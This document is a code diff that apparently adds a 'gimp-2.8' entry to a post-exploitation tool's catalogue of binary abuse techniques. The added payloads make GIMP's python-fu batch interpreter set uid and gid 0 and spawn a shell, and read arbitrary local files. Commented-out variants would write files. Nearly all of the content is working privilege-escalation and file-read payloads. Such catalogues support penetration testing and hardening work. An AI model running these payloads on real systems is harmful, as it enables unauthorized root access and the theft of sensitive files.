@@ -779,6 +779,35 @@
 		}
 	],
 //-------------------------------------------------------------------
+	"gimp-2.8": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-idf", "--batch-interpreter=python-fu-eval", "-b", "'import os, pty;exec(\"try:\\n\\tos.setuid(0);\\nexcept:\\n\\tpass\\ntry:\\n\\tos.setgid(0)\\nexcept:\\n\\tpass\"); pty.spawn(\"{shell}\");gimp.exit()'"],
+			"exit": "exit"
+		},
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command} 2>/dev/null",
+			"args": ["-idf", "--batch-interpreter=python-fu-eval", "-b", "'import sys; sys.stdout.write(open(\"{lfile}\",\"rb\").read());gimp.exit()'"]
+		}
+
+		// This 'write' technique seems to fail because it cannot capture stdin, being a "subprocess".
+		// Since it can get a shell, this is not really an issue.
+		// {
+		// 	"type": "write",
+		// 	"stream":"raw",
+		// 	"payload": "{command} 2>/dev/null",
+		// 	"args": ["-idf", "--batch-interpreter=python-fu-eval", "-b", "'import sys, shutil; shutil.copyfileobj(sys.stdin.buffer, open(\"{lfile}\",\"wb\"),length={length});gimp.exit()'"]
+		// },
+		// {
+		// 	"type": "write",
+		// 	"stream":"base64",
+		// 	"payload": "{command} 2>/dev/null",
+		// 	"args": ["-idf", "--batch-interpreter=python-fu-eval", "-b", "'exec(\"\"\"import sys,base64\\nwith open(\"{lfile}\",\"wb\") as f:\\n\\tfor chunk in iter(lambda: sys.stdin.read(4), b\"\"):\\n\\t\\tf.write(base64.b64decode(chunk))\"\"\")\\ngimp.exit()'"]
+		// }
+	],
 	"gimp": [
 		{
 			"type": "shell",
